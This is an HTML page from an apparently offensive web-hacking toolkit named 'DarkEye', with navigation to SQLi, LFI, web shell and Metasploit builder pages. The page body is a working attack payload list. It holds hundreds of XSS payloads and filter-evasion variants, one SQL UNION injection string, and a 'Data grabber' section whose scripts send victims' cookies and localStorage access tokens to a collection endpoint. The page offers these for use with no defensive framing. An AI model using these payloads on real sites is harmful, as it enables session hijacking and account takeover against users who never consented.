<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="../style/style.css?v=<?php echo(time())?>">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
  <title>DarkEye | XSS</title>
</head>
<body>
  <section class="global">
    <header>
      <nav>
        <a href="../index.php"><img id="cover" src="../images/Project.jpg" alt=""></a>
        <ul>
          <a href="./sqli.php">
            
            <li>
              <i class="fa-solid fa-database"></i>
              SQL Injection
            </li>
          </a>
          
          <a href="./xss.php">
            
            <li>
              <i class="fa-brands fa-js"></i>
              XSS
            </li>
          </a>

        </li>
        <a href="./lfi.php">
          
          <li>
            <i class="fa-solid fa-folder-closed"></i>
            LFI
          </li>
        </a>
        <a href="./msf.php">
          
          <li>
            <i class="fa-solid fa-shield-halved"></i>
            MSF Builder
            </li>
          </a>
          <a href="./osint.php">
            
            <li>
              <i class="fa-solid fa-eye"></i>
              Osint
            </li>
          </a>
          <a href="./webshell.php">
            
            <li>
              <i class="fa-solid fa-viruses"></i>
              Web Shell
            </li>
          </a>
          
          <a href="./terminal.php">
            <li>
              <i class="fa-solid fa-terminal"></i>
              Terminal
            </li>
          </a>
        </ul>
      </nav>
    </header>
    <main class="container-cc">
    <h1 class="Name-for-Payloads">XSS in HTML/Applications</h1>
    <code>
        <br>
            <pre>&lt;script&gt;alert('XSS')&lt;/script&gt;</pre>
            <br>
            <pre>&lt;scr&lt;script&gt;ipt&gt;alert('XSS')&lt;/scr&lt;script&gt;ipt&gt;</pre>
            <br>
            <pre>"&gt;&lt;script&gt;alert("XSS")&lt;/script&gt;</pre>
            <br>
            <pre>"&gt;&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;</pre>
            <br>
            <pre>&lt;img src=x onerror=alert('XSS');&gt;</pre>
            <br>
            <pre>&lt;img src=x onerror=alert('XSS')//&gt;</pre>
            <br>
            <pre>&lt;img src=x onerror=alert(String.fromCharCode(88,83,83));&gt;</pre>
            <br>
            <pre>&lt;img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));&gt;</pre>
            <br>
            <pre>&lt;img src=x:alert(alt) onerror=eval(src) alt=xss&gt;</pre>
            <br>
            <pre>"&gt;&lt;img src=x onerror=alert("XSS");&gt;</pre>
            <br>
            <pre>"&gt;&lt;img src=x onerror=alert(String.fromCharCode(88,83,83));&gt;</pre>

    </code>
    <br>
    
    <h1 class="Name-for-Payloads">Data grabber for XSS</h1>
        <code>
            <pre>&lt;script&gt;document.location='http://localhost/XSS/grabber.php?c='+document.cookie&lt;/script&gt;</pre>
            <pre>&lt;script&gt;document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')&lt;/script&gt;</pre>
            <pre>&lt;script&gt;new Image().src='http://localhost/cookie.php?c='+document.cookie;&lt;/script&gt;</pre>
            <pre>&lt;script&gt;new Image().src='http://localhost/cookie.php?c='+localStorage.getItem('access_token');&lt;/script&gt;</pre>
            
        </code>
        <br>
        <h1 class="Name-for-Payloads"></h1>
        <code>
        <h4>MySQL/MSSQL/PGSQL</h4>
            <br>
            <pre>'UNION SELECT NULL,NULL,NULL -- -</pre>
            <br>
        </code>
        <br>
        <h1 class="Name-for-Payloads">XSS RAW</h1>
    <code>
        <pre>
   "&lt;!-- Project Name  : Cross Site Scripting ( XSS ) Vulnerability Payload List --&gt;
&lt;!--        Author : Ismail Tasdelen --&gt;
&lt;!--      Linkedin : https://www.linkedin.com/in/ismailtasdelen/ --&gt;
&lt;!--        GitHub : https://github.com/ismailtasdelen/ --&gt;
&lt;!--       Twitter : https://twitter.com/ismailtsdln --&gt;
&lt;!--        Medium : https://medium.com/@ismailtasdelen --&gt;

"-prompt(8)-"
'-prompt(8)-'
";a=prompt,a()//
';a=prompt,a()//
'-eval("window['pro'%2B'mpt'](8)")-'
"-eval("window['pro'%2B'mpt'](8)")-"
"onclick=prompt(8)&gt;"@x.y
"onclick=prompt(8)&gt;&lt;svg/onload=prompt(8)&gt;"@x.y
&lt;image/src/onerror=prompt(8)&gt;
&lt;img/src/onerror=prompt(8)&gt;
&lt;image src/onerror=prompt(8)&gt;
&lt;img src/onerror=prompt(8)&gt;
&lt;image src =q onerror=prompt(8)&gt;
&lt;img src =q onerror=prompt(8)&gt;
&lt;/scrip&lt;/script&gt;t&gt;&lt;img src =q onerror=prompt(8)&gt;
&lt;script\x20type="text/javascript"&gt;javascript:alert(1);&lt;/script&gt;
&lt;script\x3Etype="text/javascript"&gt;javascript:alert(1);&lt;/script&gt;
&lt;script\x0Dtype="text/javascript"&gt;javascript:alert(1);&lt;/script&gt;
&lt;script\x09type="text/javascript"&gt;javascript:alert(1);&lt;/script&gt;
&lt;script\x0Ctype="text/javascript"&gt;javascript:alert(1);&lt;/script&gt;
&lt;script\x2Ftype="text/javascript"&gt;javascript:alert(1);&lt;/script&gt;
&lt;script\x0Atype="text/javascript"&gt;javascript:alert(1);&lt;/script&gt;
'`"&gt;&lt;\x3Cscript&gt;javascript:alert(1)&lt;/script&gt;        
'`"&gt;&lt;\x00script&gt;javascript:alert(1)&lt;/script&gt;
&lt;img src=1 href=1 onerror="javascript:alert(1)"&gt;&lt;/img&gt;
&lt;audio src=1 href=1 onerror="javascript:alert(1)"&gt;&lt;/audio&gt;
&lt;video src=1 href=1 onerror="javascript:alert(1)"&gt;&lt;/video&gt;
&lt;body src=1 href=1 onerror="javascript:alert(1)"&gt;&lt;/body&gt;
&lt;image src=1 href=1 onerror="javascript:alert(1)"&gt;&lt;/image&gt;
&lt;object src=1 href=1 onerror="javascript:alert(1)"&gt;&lt;/object&gt;
&lt;script src=1 href=1 onerror="javascript:alert(1)"&gt;&lt;/script&gt;
&lt;svg onResize svg onResize="javascript:javascript:alert(1)"&gt;&lt;/svg onResize&gt;
&lt;title onPropertyChange title onPropertyChange="javascript:javascript:alert(1)"&gt;&lt;/title onPropertyChange&gt;
&lt;iframe onLoad iframe onLoad="javascript:javascript:alert(1)"&gt;&lt;/iframe onLoad&gt;
&lt;body onMouseEnter body onMouseEnter="javascript:javascript:alert(1)"&gt;&lt;/body onMouseEnter&gt;
&lt;body onFocus body onFocus="javascript:javascript:alert(1)"&gt;&lt;/body onFocus&gt;
&lt;frameset onScroll frameset onScroll="javascript:javascript:alert(1)"&gt;&lt;/frameset onScroll&gt;
&lt;script onReadyStateChange script onReadyStateChange="javascript:javascript:alert(1)"&gt;&lt;/script onReadyStateChange&gt;
&lt;html onMouseUp html onMouseUp="javascript:javascript:alert(1)"&gt;&lt;/html onMouseUp&gt;
&lt;body onPropertyChange body onPropertyChange="javascript:javascript:alert(1)"&gt;&lt;/body onPropertyChange&gt;
&lt;svg onLoad svg onLoad="javascript:javascript:alert(1)"&gt;&lt;/svg onLoad&gt;
&lt;body onPageHide body onPageHide="javascript:javascript:alert(1)"&gt;&lt;/body onPageHide&gt;
&lt;body onMouseOver body onMouseOver="javascript:javascript:alert(1)"&gt;&lt;/body onMouseOver&gt;
&lt;body onUnload body onUnload="javascript:javascript:alert(1)"&gt;&lt;/body onUnload&gt;
&lt;body onLoad body onLoad="javascript:javascript:alert(1)"&gt;&lt;/body onLoad&gt;
&lt;bgsound onPropertyChange bgsound onPropertyChange="javascript:javascript:alert(1)"&gt;&lt;/bgsound onPropertyChange&gt;
&lt;html onMouseLeave html onMouseLeave="javascript:javascript:alert(1)"&gt;&lt;/html onMouseLeave&gt;
&lt;html onMouseWheel html onMouseWheel="javascript:javascript:alert(1)"&gt;&lt;/html onMouseWheel&gt;
&lt;style onLoad style onLoad="javascript:javascript:alert("xss")"&gt;&lt;/style onLoad&gt;
&lt;iframe onReadyStateChange iframe onReadyStateChange="javascript:javascript:alert(1)"&gt;&lt;/iframe onReadyStateChange&gt;
&lt;body onPageShow body onPageShow="javascript:javascript:alert(1)"&gt;&lt;/body onPageShow&gt;
&lt;style onReadyStateChange style onReadyStateChange="javascript:javascript:alert(1)"&gt;&lt;/style onReadyStateChange&gt;
&lt;frameset onFocus frameset onFocus="javascript:javascript:alert(1)"&gt;&lt;/frameset onFocus&gt;
&lt;applet onError applet onError="javascript:javascript:alert(1)"&gt;&lt;/applet onError&gt;
&lt;marquee onStart marquee onStart="javascript:javascript:alert(1)"&gt;&lt;/marquee onStart&gt;
&lt;script onLoad script onLoad="javascript:javascript:alert(1)"&gt;&lt;/script onLoad&gt;
&lt;html onMouseOver html onMouseOver="javascript:javascript:alert(1)"&gt;&lt;/html onMouseOver&gt;
&lt;html onMouseEnter html onMouseEnter="javascript:parent.javascript:alert(1)"&gt;&lt;/html onMouseEnter&gt;
&lt;body onBeforeUnload body onBeforeUnload="javascript:javascript:alert(1)"&gt;&lt;/body onBeforeUnload&gt;
&lt;html onMouseDown html onMouseDown="javascript:javascript:alert(1)"&gt;&lt;/html onMouseDown&gt;
&lt;marquee onScroll marquee onScroll="javascript:javascript:alert(1)"&gt;&lt;/marquee onScroll&gt;
&lt;xml onPropertyChange xml onPropertyChange="javascript:javascript:alert(1)"&gt;&lt;/xml onPropertyChange&gt;
&lt;frameset onBlur frameset onBlur="javascript:javascript:alert(1)"&gt;&lt;/frameset onBlur&gt;
&lt;applet onReadyStateChange applet onReadyStateChange="javascript:javascript:alert(1)"&gt;&lt;/applet onReadyStateChange&gt;
&lt;svg onUnload svg onUnload="javascript:javascript:alert(1)"&gt;&lt;/svg onUnload&gt;
&lt;html onMouseOut html onMouseOut="javascript:javascript:alert(1)"&gt;&lt;/html onMouseOut&gt;
&lt;body onMouseMove body onMouseMove="javascript:javascript:alert(1)"&gt;&lt;/body onMouseMove&gt;
&lt;body onResize body onResize="javascript:javascript:alert(1)"&gt;&lt;/body onResize&gt;
&lt;object onError object onError="javascript:javascript:alert(1)"&gt;&lt;/object onError&gt;
&lt;body onPopState body onPopState="javascript:javascript:alert(1)"&gt;&lt;/body onPopState&gt;
&lt;html onMouseMove html onMouseMove="javascript:javascript:alert(1)"&gt;&lt;/html onMouseMove&gt;
&lt;applet onreadystatechange applet onreadystatechange="javascript:javascript:alert(1)"&gt;&lt;/applet onreadystatechange&gt;
&lt;body onpagehide body onpagehide="javascript:javascript:alert(1)"&gt;&lt;/body onpagehide&gt;
&lt;svg onunload svg onunload="javascript:javascript:alert(1)"&gt;&lt;/svg onunload&gt;
&lt;applet onerror applet onerror="javascript:javascript:alert(1)"&gt;&lt;/applet onerror&gt;
&lt;body onkeyup body onkeyup="javascript:javascript:alert(1)"&gt;&lt;/body onkeyup&gt;
&lt;body onunload body onunload="javascript:javascript:alert(1)"&gt;&lt;/body onunload&gt;
&lt;iframe onload iframe onload="javascript:javascript:alert(1)"&gt;&lt;/iframe onload&gt;
&lt;body onload body onload="javascript:javascript:alert(1)"&gt;&lt;/body onload&gt;
&lt;html onmouseover html onmouseover="javascript:javascript:alert(1)"&gt;&lt;/html onmouseover&gt;
&lt;object onbeforeload object onbeforeload="javascript:javascript:alert(1)"&gt;&lt;/object onbeforeload&gt;
&lt;body onbeforeunload body onbeforeunload="javascript:javascript:alert(1)"&gt;&lt;/body onbeforeunload&gt;
&lt;body onfocus body onfocus="javascript:javascript:alert(1)"&gt;&lt;/body onfocus&gt;
&lt;body onkeydown body onkeydown="javascript:javascript:alert(1)"&gt;&lt;/body onkeydown&gt;
&lt;iframe onbeforeload iframe onbeforeload="javascript:javascript:alert(1)"&gt;&lt;/iframe onbeforeload&gt;
&lt;iframe src iframe src="javascript:javascript:alert(1)"&gt;&lt;/iframe src&gt;
&lt;svg onload svg onload="javascript:javascript:alert(1)"&gt;&lt;/svg onload&gt;
&lt;html onmousemove html onmousemove="javascript:javascript:alert(1)"&gt;&lt;/html onmousemove&gt;
&lt;body onblur body onblur="javascript:javascript:alert(1)"&gt;&lt;/body onblur&gt;
\x3Cscript&gt;javascript:alert(1)&lt;/script&gt;
'"`&gt;&lt;script&gt;/* *\x2Fjavascript:alert(1)// */&lt;/script&gt;
&lt;script&gt;javascript:alert(1)&lt;/script\x0D
&lt;script&gt;javascript:alert(1)&lt;/script\x0A
&lt;script&gt;javascript:alert(1)&lt;/script\x0B
&lt;script charset="\x22&gt;javascript:alert(1)&lt;/script&gt;
&lt;!--\x3E&lt;img src=xxx:x onerror=javascript:alert(1)&gt; --&gt;
--&gt;&lt;!-- ---&gt; &lt;img src=xxx:x onerror=javascript:alert(1)&gt; --&gt;
--&gt;&lt;!-- --\x00&gt; &lt;img src=xxx:x onerror=javascript:alert(1)&gt; --&gt;
--&gt;&lt;!-- --\x21&gt; &lt;img src=xxx:x onerror=javascript:alert(1)&gt; --&gt;
--&gt;&lt;!-- --\x3E&gt; &lt;img src=xxx:x onerror=javascript:alert(1)&gt; --&gt;
`"'&gt;&lt;img src='#\x27 onerror=javascript:alert(1)&gt;
&lt;a href="javascript\x3Ajavascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
"'`&gt;&lt;p&gt;&lt;svg&gt;&lt;script&gt;a='hello\x27;javascript:alert(1)//';&lt;/script&gt;&lt;/p&gt;
&lt;a href="javas\x00cript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="javas\x07cript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="javas\x0Dcript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="javas\x0Acript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="javas\x08cript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="javas\x02cript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="javas\x03cript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="javas\x04cript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="javas\x01cript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="javas\x05cript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="javas\x0Bcript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="javas\x09cript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="javas\x06cript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="javas\x0Ccript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;script&gt;/* *\x2A/javascript:alert(1)// */&lt;/script&gt;
&lt;script&gt;/* *\x00/javascript:alert(1)// */&lt;/script&gt;
&lt;style&gt;&lt;/style\x3E&lt;img src="about:blank" onerror=javascript:alert(1)//&gt;&lt;/style&gt;
&lt;style&gt;&lt;/style\x0D&lt;img src="about:blank" onerror=javascript:alert(1)//&gt;&lt;/style&gt;
&lt;style&gt;&lt;/style\x09&lt;img src="about:blank" onerror=javascript:alert(1)//&gt;&lt;/style&gt;
&lt;style&gt;&lt;/style\x20&lt;img src="about:blank" onerror=javascript:alert(1)//&gt;&lt;/style&gt;
&lt;style&gt;&lt;/style\x0A&lt;img src="about:blank" onerror=javascript:alert(1)//&gt;&lt;/style&gt;
"'`&gt;ABC&lt;div style="font-family:'foo'\x7Dx:expression(javascript:alert(1);/*';"&gt;DEF 
"'`&gt;ABC&lt;div style="font-family:'foo'\x3Bx:expression(javascript:alert(1);/*';"&gt;DEF 
%253Cscript%253Ealert('XSS')%253C%252Fscript%253E
&lt;script&gt;if("x\\xE1\x96\x89".length==2) { javascript:alert(1);}&lt;/script&gt;
&lt;script&gt;if("x\\xE0\xB9\x92".length==2) { javascript:alert(1);}&lt;/script&gt;
&lt;script&gt;if("x\\xEE\xA9\x93".length==2) { javascript:alert(1);}&lt;/script&gt;
'`"&gt;&lt;\x3Cscript&gt;javascript:alert(1)&lt;/script&gt;
'`"&gt;&lt;\x00script&gt;javascript:alert(1)&lt;/script&gt;
"'`&gt;&lt;\x3Cimg src=xxx:x onerror=javascript:alert(1)&gt;
"'`&gt;&lt;\x00img src=xxx:x onerror=javascript:alert(1)&gt;
&lt;script src="data:text/plain\x2Cjavascript:alert(1)"&gt;&lt;/script&gt;
&lt;script src="data:\xD4\x8F,javascript:alert(1)"&gt;&lt;/script&gt;
&lt;script src="data:\xE0\xA4\x98,javascript:alert(1)"&gt;&lt;/script&gt;
&lt;script src="data:\xCB\x8F,javascript:alert(1)"&gt;&lt;/script&gt;
&lt;script\x20type="text/javascript"&gt;javascript:alert(1);&lt;/script&gt;
&lt;script\x3Etype="text/javascript"&gt;javascript:alert(1);&lt;/script&gt;
&lt;script\x0Dtype="text/javascript"&gt;javascript:alert(1);&lt;/script&gt;
&lt;script\x09type="text/javascript"&gt;javascript:alert(1);&lt;/script&gt;
&lt;script\x0Ctype="text/javascript"&gt;javascript:alert(1);&lt;/script&gt;
&lt;script\x2Ftype="text/javascript"&gt;javascript:alert(1);&lt;/script&gt;
&lt;script\x0Atype="text/javascript"&gt;javascript:alert(1);&lt;/script&gt;
ABC&lt;div style="x\x3Aexpression(javascript:alert(1)"&gt;DEF
ABC&lt;div style="x:expression\x5C(javascript:alert(1)"&gt;DEF
ABC&lt;div style="x:expression\x00(javascript:alert(1)"&gt;DEF
ABC&lt;div style="x:exp\x00ression(javascript:alert(1)"&gt;DEF
ABC&lt;div style="x:exp\x5Cression(javascript:alert(1)"&gt;DEF
ABC&lt;div style="x:\x0Aexpression(javascript:alert(1)"&gt;DEF
ABC&lt;div style="x:\x09expression(javascript:alert(1)"&gt;DEF
ABC&lt;div style="x:\xE3\x80\x80expression(javascript:alert(1)"&gt;DEF
ABC&lt;div style="x:\xE2\x80\x84expression(javascript:alert(1)"&gt;DEF
ABC&lt;div style="x:\xC2\xA0expression(javascript:alert(1)"&gt;DEF
ABC&lt;div style="x:\xE2\x80\x80expression(javascript:alert(1)"&gt;DEF
ABC&lt;div style="x:\xE2\x80\x8Aexpression(javascript:alert(1)"&gt;DEF
ABC&lt;div style="x:\x0Dexpression(javascript:alert(1)"&gt;DEF
ABC&lt;div style="x:\x0Cexpression(javascript:alert(1)"&gt;DEF
ABC&lt;div style="x:\xE2\x80\x87expression(javascript:alert(1)"&gt;DEF
ABC&lt;div style="x:\xEF\xBB\xBFexpression(javascript:alert(1)"&gt;DEF
ABC&lt;div style="x:\x20expression(javascript:alert(1)"&gt;DEF
ABC&lt;div style="x:\xE2\x80\x88expression(javascript:alert(1)"&gt;DEF
ABC&lt;div style="x:\x00expression(javascript:alert(1)"&gt;DEF
ABC&lt;div style="x:\xE2\x80\x8Bexpression(javascript:alert(1)"&gt;DEF
ABC&lt;div style="x:\xE2\x80\x86expression(javascript:alert(1)"&gt;DEF
ABC&lt;div style="x:\xE2\x80\x85expression(javascript:alert(1)"&gt;DEF
ABC&lt;div style="x:\xE2\x80\x82expression(javascript:alert(1)"&gt;DEF
ABC&lt;div style="x:\x0Bexpression(javascript:alert(1)"&gt;DEF
ABC&lt;div style="x:\xE2\x80\x81expression(javascript:alert(1)"&gt;DEF
ABC&lt;div style="x:\xE2\x80\x83expression(javascript:alert(1)"&gt;DEF
ABC&lt;div style="x:\xE2\x80\x89expression(javascript:alert(1)"&gt;DEF
&lt;a href="\x0Bjavascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="\x0Fjavascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="\xC2\xA0javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="\x05javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="\xE1\xA0\x8Ejavascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="\x18javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="\x11javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="\xE2\x80\x88javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="\xE2\x80\x89javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="\xE2\x80\x80javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="\x17javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="\x03javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="\x0Ejavascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="\x1Ajavascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="\x00javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="\x10javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="\xE2\x80\x82javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="\x20javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="\x13javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="\x09javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="\xE2\x80\x8Ajavascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="\x14javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="\x19javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="\xE2\x80\xAFjavascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="\x1Fjavascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="\xE2\x80\x81javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="\x1Djavascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="\xE2\x80\x87javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="\x07javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="\xE1\x9A\x80javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="\xE2\x80\x83javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="\x04javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="\x01javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="\x08javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="\xE2\x80\x84javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="\xE2\x80\x86javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="\xE3\x80\x80javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="\x12javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="\x0Djavascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="\x0Ajavascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="\x0Cjavascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="\x15javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="\xE2\x80\xA8javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="\x16javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="\x02javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="\x1Bjavascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="\x06javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="\xE2\x80\xA9javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="\xE2\x80\x85javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="\x1Ejavascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="\xE2\x81\x9Fjavascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="\x1Cjavascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="javascript\x00:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="javascript\x3A:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="javascript\x09:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="javascript\x0D:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
&lt;a href="javascript\x0A:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
`"'&gt;&lt;img src=xxx:x \x0Aonerror=javascript:alert(1)&gt;
`"'&gt;&lt;img src=xxx:x \x22onerror=javascript:alert(1)&gt;
`"'&gt;&lt;img src=xxx:x \x0Bonerror=javascript:alert(1)&gt;
`"'&gt;&lt;img src=xxx:x \x0Donerror=javascript:alert(1)&gt;
`"'&gt;&lt;img src=xxx:x \x2Fonerror=javascript:alert(1)&gt;
`"'&gt;&lt;img src=xxx:x \x09onerror=javascript:alert(1)&gt;
`"'&gt;&lt;img src=xxx:x \x0Conerror=javascript:alert(1)&gt;
`"'&gt;&lt;img src=xxx:x \x00onerror=javascript:alert(1)&gt;
`"'&gt;&lt;img src=xxx:x \x27onerror=javascript:alert(1)&gt;
`"'&gt;&lt;img src=xxx:x \x20onerror=javascript:alert(1)&gt;
"`'&gt;&lt;script&gt;\x3Bjavascript:alert(1)&lt;/script&gt;
"`'&gt;&lt;script&gt;\x0Djavascript:alert(1)&lt;/script&gt;
"`'&gt;&lt;script&gt;\xEF\xBB\xBFjavascript:alert(1)&lt;/script&gt;
"`'&gt;&lt;script&gt;\xE2\x80\x81javascript:alert(1)&lt;/script&gt;
"`'&gt;&lt;script&gt;\xE2\x80\x84javascript:alert(1)&lt;/script&gt;
"`'&gt;&lt;script&gt;\xE3\x80\x80javascript:alert(1)&lt;/script&gt;
"`'&gt;&lt;script&gt;\x09javascript:alert(1)&lt;/script&gt;
"`'&gt;&lt;script&gt;\xE2\x80\x89javascript:alert(1)&lt;/script&gt;
"`'&gt;&lt;script&gt;\xE2\x80\x85javascript:alert(1)&lt;/script&gt;
"`'&gt;&lt;script&gt;\xE2\x80\x88javascript:alert(1)&lt;/script&gt;
"`'&gt;&lt;script&gt;\x00javascript:alert(1)&lt;/script&gt;
"`'&gt;&lt;script&gt;\xE2\x80\xA8javascript:alert(1)&lt;/script&gt;
"`'&gt;&lt;script&gt;\xE2\x80\x8Ajavascript:alert(1)&lt;/script&gt;
"`'&gt;&lt;script&gt;\xE1\x9A\x80javascript:alert(1)&lt;/script&gt;
"`'&gt;&lt;script&gt;\x0Cjavascript:alert(1)&lt;/script&gt;
"`'&gt;&lt;script&gt;\x2Bjavascript:alert(1)&lt;/script&gt;
"`'&gt;&lt;script&gt;\xF0\x90\x96\x9Ajavascript:alert(1)&lt;/script&gt;
"`'&gt;&lt;script&gt;-javascript:alert(1)&lt;/script&gt;
"`'&gt;&lt;script&gt;\x0Ajavascript:alert(1)&lt;/script&gt;
"`'&gt;&lt;script&gt;\xE2\x80\xAFjavascript:alert(1)&lt;/script&gt;
"`'&gt;&lt;script&gt;\x7Ejavascript:alert(1)&lt;/script&gt;
"`'&gt;&lt;script&gt;\xE2\x80\x87javascript:alert(1)&lt;/script&gt;
"`'&gt;&lt;script&gt;\xE2\x81\x9Fjavascript:alert(1)&lt;/script&gt;
"`'&gt;&lt;script&gt;\xE2\x80\xA9javascript:alert(1)&lt;/script&gt;
"`'&gt;&lt;script&gt;\xC2\x85javascript:alert(1)&lt;/script&gt;
"`'&gt;&lt;script&gt;\xEF\xBF\xAEjavascript:alert(1)&lt;/script&gt;
"`'&gt;&lt;script&gt;\xE2\x80\x83javascript:alert(1)&lt;/script&gt;
"`'&gt;&lt;script&gt;\xE2\x80\x8Bjavascript:alert(1)&lt;/script&gt;
"`'&gt;&lt;script&gt;\xEF\xBF\xBEjavascript:alert(1)&lt;/script&gt;
"`'&gt;&lt;script&gt;\xE2\x80\x80javascript:alert(1)&lt;/script&gt;
"`'&gt;&lt;script&gt;\x21javascript:alert(1)&lt;/script&gt;
"`'&gt;&lt;script&gt;\xE2\x80\x82javascript:alert(1)&lt;/script&gt;
"`'&gt;&lt;script&gt;\xE2\x80\x86javascript:alert(1)&lt;/script&gt;
"`'&gt;&lt;script&gt;\xE1\xA0\x8Ejavascript:alert(1)&lt;/script&gt;
"`'&gt;&lt;script&gt;\x0Bjavascript:alert(1)&lt;/script&gt;
"`'&gt;&lt;script&gt;\x20javascript:alert(1)&lt;/script&gt;
"`'&gt;&lt;script&gt;\xC2\xA0javascript:alert(1)&lt;/script&gt;
